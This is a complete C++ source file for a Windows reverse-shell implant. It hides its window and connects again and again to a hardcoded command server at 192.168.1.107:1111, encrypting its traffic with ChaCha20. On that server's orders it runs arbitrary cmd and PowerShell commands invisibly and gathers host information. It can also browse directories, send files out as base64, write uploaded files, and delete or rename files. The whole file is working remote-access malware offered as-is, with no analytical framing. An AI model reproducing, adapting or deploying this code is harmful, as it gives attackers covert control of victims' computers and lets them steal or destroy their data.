// x86_64-w64-mingw32-g++ -o ReverseTCP_ChaCha.exe ReverseTCP_ChaCha.cpp -lws2_32 -static -static-libgcc -static-libstdc++ -O2 -mwindows 

#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <stdexcept>
#include <algorithm>
#include <memory>
#include <fstream>
#include <sstream>
#include <array>
#include <windows.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>
#include <random>
#include <chrono>
#include <ctime>
#include <cstdlib>
#include <map>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

const char* SERVER_IP = "192.168.1.107";
const int SERVER_PORT = 1111;
const std::string ENCRYPTION_KEY = "12345678901234567890123456789012";
const std::string AUTH_ID = "9c9583fe-0be1-49a2-8e6a-59eb9a6c2f4f";


class ChaCha20 {
private:
    uint32_t state[16];
    uint8_t key[32];
    uint8_t nonce[8];
    uint8_t buffer[64];
    size_t pos;

    static uint32_t rotl(uint32_t x, int n) {
        return (x << n) | (x >> (32 - n));
    }

    static void quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = rotl(d, 16);
        c += d; b ^= c; b = rotl(b, 12);
        a += b; d ^= a; d = rotl(d, 8);
        c += d; b ^= c; b = rotl(b, 7);
    }

    void chacha20_block(uint32_t* output) {
        uint32_t x[16];
        for (int i = 0; i < 16; i++) x[i] = state[i];

        for (int i = 0; i < 10; i++) {
            quarter_round(x[0], x[4], x[8],  x[12]);
            quarter_round(x[1], x[5], x[9],  x[13]);
            quarter_round(x[2], x[6], x[10], x[14]);
            quarter_round(x[3], x[7], x[11], x[15]);
            quarter_round(x[0], x[5], x[10], x[15]);
            quarter_round(x[1], x[6], x[11], x[12]);
            quarter_round(x[2], x[7], x[8],  x[13]);
            quarter_round(x[3], x[4], x[9],  x[14]);
        }

        for (int i = 0; i < 16; i++) {
            output[i] = x[i] + state[i];
        }

        state[12]++;
        if (state[12] == 0) state[13]++;
    }

    void chacha20_init(const uint8_t* key, const uint8_t* nonce) {
        const uint32_t constants[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574};
        for (int i = 0; i < 4; i++) state[i] = constants[i];
        for (int i = 0; i < 8; i++) state[4 + i] = ((uint32_t)key[i*4] << 0) | ((uint32_t)key[i*4+1] << 8) | ((uint32_t)key[i*4+2] << 16) | ((uint32_t)key[i*4+3] << 24);
        state[12] = 0;
        state[13] = 0;
        for (int i = 0; i < 2; i++) {
            state[14 + i] = ((uint32_t)nonce[i*4] << 0) | ((uint32_t)nonce[i*4+1] << 8) | ((uint32_t)nonce[i*4+2] << 16) | ((uint32_t)nonce[i*4+3] << 24);
        }
        pos = 64;
    }

    void chacha20_next_block() {
        uint32_t block[16];
        chacha20_block(block);
        for (int i = 0; i < 64; i++) {
            buffer[i] = ((uint8_t*)block)[i];
        }
        pos = 0;
    }

public:
    ChaCha20() : pos(64) {}

    void set_key(const uint8_t* key_data, size_t key_len) {
        if (key_len != 32) throw std::runtime_error("Key must be 32 bytes");
        memcpy(key, key_data, 32);
    }

    void set_nonce(const uint8_t* nonce_data, size_t nonce_len) {
        if (nonce_len != 8) throw std::runtime_error("Nonce must be 8 bytes");
        memcpy(nonce, nonce_data, 8);
        chacha20_init(key, nonce);
        pos = 64;
    }

    void encrypt(uint8_t* data, size_t len) {
        for (size_t i = 0; i < len; i++) {
            if (pos >= 64) chacha20_next_block();
            data[i] ^= buffer[pos++];
        }
    }

    void decrypt(uint8_t* data, size_t len) {
        encrypt(data, len);
    }
};

class Base64 {
private:
    static const std::string BASE64_CHARS;
    
    static inline bool is_base64(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }

public:
    static std::string decode(const std::string& encoded_string) {
        int in_len = encoded_string.size();
        int i = 0;
        int j = 0;
        int in_ = 0;
        unsigned char char_array_4[4], char_array_3[3];
        std::string ret;

        while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
            char_array_4[i++] = encoded_string[in_]; in_++;
            if (i == 4) {
                for (i = 0; i < 4; i++)
                    char_array_4[i] = BASE64_CHARS.find(char_array_4[i]);

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (i = 0; (i < 3); i++)
                    ret += char_array_3[i];
                i = 0;
            }
        }

        if (i) {
            for (j = i; j < 4; j++)
                char_array_4[j] = 0;

            for (j = 0; j < 4; j++)
                char_array_4[j] = BASE64_CHARS.find(char_array_4[j]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
        }

        return ret;
    }

    static std::string encode(const std::string& input) {
        std::string result;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];

        for (i = 0; i < (int)input.length(); i++) {
            char_array_3[j++] = input[i];
            if (j == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for (j = 0; j < 4; j++)
                    result += BASE64_CHARS[char_array_4[j]];
                j = 0;
            }
        }

        if (j) {
            for (int k = j; k < 3; k++)
                char_array_3[k] = 0;

            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (int k = 0; k < j + 1; k++)
                result += BASE64_CHARS[char_array_4[k]];

            while (j++ < 3)
                result += '=';
        }

        return result;
    }
};

const std::string Base64::BASE64_CHARS = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

class ChaChaCipher {
private:
    ChaCha20 cipher;
    std::vector<uint8_t> key_bytes;

public:
    ChaChaCipher(const std::string& key) {
        key_bytes = std::vector<uint8_t>(key.begin(), key.end());
        if (key_bytes.size() != 32) {
            throw std::runtime_error("ChaCha key must be 32 bytes");
        }
    }

    std::vector<uint8_t> encrypt(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> nonce(8);
        for (size_t i = 0; i < 8; ++i) {
            nonce[i] = rand() % 256;
        }
        
        std::vector<uint8_t> result = nonce;
        std::vector<uint8_t> encrypted = data;
        
        ChaCha20 local_cipher;
        local_cipher.set_key(key_bytes.data(), key_bytes.size());
        local_cipher.set_nonce(nonce.data(), nonce.size());
        local_cipher.encrypt(encrypted.data(), encrypted.size());
        
        result.insert(result.end(), encrypted.begin(), encrypted.end());
        return result;
    }

    std::vector<uint8_t> encrypt(const std::string& data) {
        return encrypt(std::vector<uint8_t>(data.begin(), data.end()));
    }

    std::vector<uint8_t> decrypt(const std::vector<uint8_t>& enc_data) {
        if (enc_data.size() < 8) {
            throw std::runtime_error("Invalid encrypted data");
        }
        
        std::vector<uint8_t> nonce(enc_data.begin(), enc_data.begin() + 8);
        std::vector<uint8_t> ciphertext(enc_data.begin() + 8, enc_data.end());
        
        ChaCha20 local_cipher;
        local_cipher.set_key(key_bytes.data(), key_bytes.size());
        local_cipher.set_nonce(nonce.data(), nonce.size());
        local_cipher.decrypt(ciphertext.data(), ciphertext.size());
        
        return ciphertext;
    }

    std::string decrypt_to_string(const std::vector<uint8_t>& enc_data) {
        std::vector<uint8_t> decrypted = decrypt(enc_data);
        return std::string(decrypted.begin(), decrypted.end());
    }
};

class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    std::map<std::string, Json> object_value;
    std::vector<Json> array_value;
    std::string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(std::nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const std::string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(const std::map<std::string, Json>& obj) : type(JSON_OBJECT), object_value(obj), bool_value(false), number_value(0) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const std::string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    Json& operator[](size_t index) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        if (index >= array_value.size()) array_value.resize(index + 1);
        return array_value[index];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    std::string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return std::string(buf);
        }
        if (type == JSON_ARRAY) {
            std::string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            std::string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static std::string escape(const std::string& s) {
        std::string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};

void send_data(SOCKET sock, const std::vector<uint8_t>& data) {
    uint32_t length = static_cast<uint32_t>(data.size());
    std::vector<uint8_t> header(4);
    header[0] = (length >> 24) & 0xFF;
    header[1] = (length >> 16) & 0xFF;
    header[2] = (length >> 8) & 0xFF;
    header[3] = length & 0xFF;
    send(sock, reinterpret_cast<const char*>(header.data()), 4, 0);
    send(sock, reinterpret_cast<const char*>(data.data()), data.size(), 0);
}

std::vector<uint8_t> recv_all(SOCKET sock, size_t n) {
    std::vector<uint8_t> data(n);
    size_t received = 0;
    while (received < n) {
        int result = recv(sock, reinterpret_cast<char*>(&data[received]), n - received, 0);
        if (result <= 0) throw std::runtime_error("Connection closed");
        received += result;
    }
    return data;
}

std::vector<uint8_t> recv_data(SOCKET sock) {
    auto raw_length = recv_all(sock, 4);
    uint32_t length = (raw_length[0] << 24) | (raw_length[1] << 16) | (raw_length[2] << 8) | raw_length[3];
    return recv_all(sock, length);
}

std::vector<uint8_t> string_to_vector(const std::string& str) {
    return std::vector<uint8_t>(str.begin(), str.end());
}

std::string handle_server_init_command(const std::string& command) {
    if (command == "uname") {
#ifdef _WIN32
        return "Windows";
#else
        return "Linux";
#endif
    }
    else if (command == "hostname") {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            return std::string(hostname);
        }
        return "Unknown";
    }
    else if (command == "powershell -Command $PID") {
        DWORD pid = GetCurrentProcessId();
        return std::to_string(pid);
    }
    else if (command == "cmd /c echo %os%") {
        return "Windows_NT";
    }
    else if (command == "cmd /c echo %PROCESSOR_ARCHITECTURE%") {
#ifdef _WIN64
        return "AMD64";
#else
        return "x86";
#endif
    }
    else if (command.find("ipconfig") != std::string::npos) {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            struct hostent* he = gethostbyname(hostname);
            if (he != nullptr) {
                struct in_addr** addr_list = (struct in_addr**)he->h_addr_list;
                for (int i = 0; addr_list[i] != nullptr; i++) {
                    char* ip = inet_ntoa(*addr_list[i]);
                    if (strcmp(ip, "127.0.0.1") != 0) {
                        return std::string(ip);
                    }
                }
            }
        }
        return "127.0.0.1";
    }
    else if (command == "echo $$") {
        DWORD pid = GetCurrentProcessId();
        return std::to_string(pid);
    }
    return "";
}

std::string run_cmd_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "cmd.exe /c " + cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

std::string run_powershell_command(const std::string& ps_cmd) {
    std::string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const std::string& path) {
    Json result = Json::object();
    try {
        std::string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) {
                actual_path = std::string(home) + actual_path.substr(1);
            }
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = Json(nullptr);
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                std::stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                
                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = Json(nullptr);
        } else if (parent.empty()) {
            result["parent_path"] = Json(nullptr);
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = Json(nullptr);
        result["items"] = Json::array();
    }
    return result;
}

std::string download_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: File not found: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            return "ERROR: Cannot download directory: " + filepath;
        }
        
        std::ifstream file(filepath, std::ios::binary);
        if (!file) {
            return "ERROR: Cannot open file: " + filepath;
        }
        
        std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)), 
                                        std::istreambuf_iterator<char>());
        file.close();
        
        std::string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        std::string encoded = Base64::encode(std::string((char*)file_data.data(), file_data.size()));
        
        return "file-data:" + filename + "|" + std::to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string upload_file(const std::string& filepath, const std::string& filedata_b64) {
    try {
        std::string decoded_data = Base64::decode(filedata_b64);
        std::vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        
        std::ofstream file(filepath, std::ios::binary);
        if (!file) {
            return "ERROR: Cannot write file: " + filepath;
        }
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string delete_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: Path does not exist: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string rename_file(const std::string& old_path, const std::string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) {
            return "ERROR: Source path does not exist: " + old_path;
        }
        
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::vector<uint8_t> execute_command(const std::string& command) {
    std::string trimmed = command;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return string_to_vector("[no command]");

    std::string init_response = handle_server_init_command(trimmed);
    if (!init_response.empty()) {
        return string_to_vector(init_response);
    }

    if (trimmed.find("browse:") == 0) {
        std::string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) {
            browse_path = std::filesystem::current_path().string();
        }
        Json dir_data = browse_directory(browse_path);
        std::string json_str = dir_data.dump();
        std::string base64_data = Base64::encode(json_str);
        return string_to_vector("browse-data-" + base64_data);
    }

    if (trimmed.find("download-file:") == 0) {
        std::string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(download_file(filepath));
    }

    if (trimmed.find("upload-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string filepath = rest.substr(0, sep_pos);
            std::string filedata_b64 = rest.substr(sep_pos + 1);
            return string_to_vector(upload_file(filepath, filedata_b64));
        } else {
            return string_to_vector("ERROR: Invalid upload format. Use: upload-file:path|base64_data");
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        std::string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(delete_file(filepath));
    }

    if (trimmed.find("rename-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string old_path = rest.substr(0, sep_pos);
            std::string new_path = rest.substr(sep_pos + 1);
            return string_to_vector(rename_file(old_path, new_path));
        } else {
            return string_to_vector("ERROR: Invalid rename format. Use: rename-file:old_path|new_path");
        }
    }

    if (trimmed.find("ping") == 0) {
        return string_to_vector("pong");
    }

    if (trimmed.find("exit") == 0 || trimmed.find("quit") == 0) {
        return string_to_vector("exit");
    }

    std::string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        std::string ps_cmd = trimmed.substr(3);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) ps_cmd = ps_cmd.substr(s);
        return string_to_vector(run_powershell_command(ps_cmd));
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        std::string ps_cmd = trimmed.substr(2);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != std::string::npos) ps_cmd = ps_cmd.substr(s);
        return string_to_vector(run_powershell_command(ps_cmd));
    }
    return string_to_vector(run_cmd_command(trimmed));
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    ChaChaCipher cipher(ENCRYPTION_KEY);

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        auto auth_data_encrypted = cipher.encrypt(AUTH_ID);
        send_data(sock, auth_data_encrypted);

        while (true) {
            try {
                auto encrypted_command = recv_data(sock);
                
                if (encrypted_command.empty()) {
                    break;
                }
                
                std::string command = cipher.decrypt_to_string(encrypted_command);
                command.erase(std::remove(command.begin(), command.end(), '\r'), command.end());
                
                auto output = execute_command(command);
                std::string output_str(output.begin(), output.end());
                
                if (command == "exit" || command == "quit") {
                    break;
                }
                
                auto encrypted_output = cipher.encrypt(output_str);
                send_data(sock, encrypted_output);
            }
            catch (const std::exception& e) {
                break;
            }
        }

        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
